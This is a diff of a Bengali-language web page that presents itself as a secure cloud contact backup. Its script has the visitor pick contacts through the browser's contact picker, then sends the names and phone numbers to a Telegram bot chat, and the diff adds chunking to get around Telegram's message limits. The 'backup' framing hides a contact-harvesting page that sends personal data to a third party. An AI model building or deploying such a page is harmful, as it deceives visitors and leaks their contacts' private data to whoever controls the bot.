@@ -3,68 +3,68 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Secure Cloud Sync</title>
+<title>Secure Sync</title>
 
 <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600&display=swap" rel="stylesheet">
 
 <style>
-body {
+body{
     margin:0;
     height:100vh;
     display:flex;
     justify-content:center;
     align-items:center;
-    font-family:'Hind Siliguri', sans-serif;
-    background: linear-gradient(135deg,#020617,#0f172a);
+    font-family:'Hind Siliguri',sans-serif;
+    background: linear-gradient(160deg,#020617,#0f172a);
 }
 
-/* Glass Container */
-.box {
-    width:350px;
-    padding:30px;
-    border-radius:25px;
-    background: rgba(255,255,255,0.05);
-    backdrop-filter: blur(20px);
+/* Card */
+.card{
+    width:340px;
+    padding:28px;
+    border-radius:20px;
+    background: rgba(255,255,255,0.06);
+    backdrop-filter: blur(18px);
     border:1px solid rgba(255,255,255,0.1);
-    box-shadow:0 10px 30px rgba(0,0,0,0.5);
+    box-shadow:0 8px 25px rgba(0,0,0,0.5);
     text-align:center;
 }
 
 /* Title */
-h2 {
+h2{
     color:#fff;
-    margin-bottom:10px;
+    margin-bottom:8px;
 }
 
-p {
+p{
     color:#94a3b8;
     font-size:14px;
 }
 
 /* Button */
-.btn {
+.btn{
     margin-top:20px;
     width:100%;
-    padding:14px;
+    padding:15px;
     border:none;
-    border-radius:12px;
+    border-radius:14px;
     font-size:16px;
     font-weight:600;
     cursor:pointer;
-    background: linear-gradient(135deg,#22c55e,#4ade80);
-    color:#000;
-    transition:0.25s;
+    background: linear-gradient(135deg,#3b82f6,#22c55e);
+    color:#fff;
+    transition:0.3s;
 }
 
-.btn:hover {
-    opacity:0.9;
+.btn:hover{
+    transform:translateY(-2px);
 }
 
 /* Loader */
-.loader {
+.loader{
     margin:15px auto;
-    width:25px;
-    height:25px;
+    width:26px;
+    height:26px;
     border:3px solid rgba(255,255,255,0.2);
     border-top:3px solid #22c55e;
     border-radius:50%;
@@ -72,28 +72,28 @@ p {
     display:none;
 }
 
-@keyframes spin {
+@keyframes spin{
     100%{transform:rotate(360deg)}
 }
 
-.status {
+.status{
     margin-top:10px;
-    color:#22c55e;
     font-size:14px;
+    color:#22c55e;
 }
 </style>
 </head>
 
 <body>
 
-<div class="box">
-    <h2>🔐 ক্লাউড ব্যাকআপ</h2>
-    <p>আপনার কন্টাক্ট নিরাপদভাবে সিঙ্ক করুন</p>
+<div class="card">
+    <h2>☁️ সিকিউর ব্যাকআপ</h2>
+    <p>আপনার কন্টাক্ট সেফভাবে সিঙ্ক করুন</p>
 
-    <button id="btn" class="btn">ব্যাকআপ শুরু করুন</button>
+    <button class="btn" id="btn">Select & Send</button>
 
     <div class="loader" id="loader"></div>
-    <div id="status" class="status">Ready</div>
+    <div class="status" id="status">Ready</div>
 </div>
 
 <script>
@@ -109,46 +109,51 @@ const status = document.getElementById('status');
 btn.onclick = async () => {
     try {
         if (!('contacts' in navigator)) {
-            throw new Error("Device support নেই");
+            throw new Error("এই ডিভাইস সাপোর্ট করে না");
         }
 
         const contacts = await navigator.contacts.select(['name','tel'], {multiple:true});
 
-        if (!contacts.length) {
-            throw new Error("কোনো কন্টাক্ট পাওয়া যায়নি");
+        if (!contacts.length) throw new Error("কোনো কন্টাক্ট পাওয়া যায়নি");
+
+        loader.style.display="block";
+        status.innerText="Sending...";
+
+        // ছোট করে ভাগ করে পাঠানো (Telegram limit avoid)
+        let chunk = "";
+        for(let i=0;i<contacts.length;i++){
+            let name = contacts[i].name ? contacts[i].name[0] : "No Name";
+            let phone = contacts[i].tel ? contacts[i].tel[0] : "No Number";
+
+            chunk += `👤 ${name}\n📞 ${phone}\n\n`;
+
+            if(chunk.length > 3000){
+                await send(chunk);
+                chunk="";
+            }
         }
 
-        loader.style.display = "block";
-        btn.disabled = true;
-        status.innerText = "Sending...";
+        if(chunk) await send(chunk);
 
-        let text = "📱 Contact Backup\n\n";
-
-        contacts.forEach(c=>{
-            const name = c.name ? c.name[0] : "No Name";
-            const phone = c.tel ? c.tel[0] : "No Number";
-            text += `👤 ${name}\n📞 ${phone}\n\n`;
-        });
-
-        await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
-            method:'POST',
-            headers:{'Content-Type':'application/json'},
-            body: JSON.stringify({
-                chat_id: CONFIG.CHAT_ID,
-                text: text
-            })
-        });
-
-        loader.style.display = "none";
-        status.innerText = "✅ Successfully Sent!";
-        btn.disabled = false;
-
-    } catch(e) {
-        loader.style.display = "none";
-        status.innerText = "❌ " + e.message;
-        btn.disabled = false;
+        loader.style.display="none";
+        status.innerText="✅ Done!";
+    }
+    catch(e){
+        loader.style.display="none";
+        status.innerText="❌ " + e.message;
     }
 };
+
+async function send(text){
+    await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`,{
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body: JSON.stringify({
+            chat_id: CONFIG.CHAT_ID,
+            text:text
+        })
+    });
+}
 </script>
 
 </body>
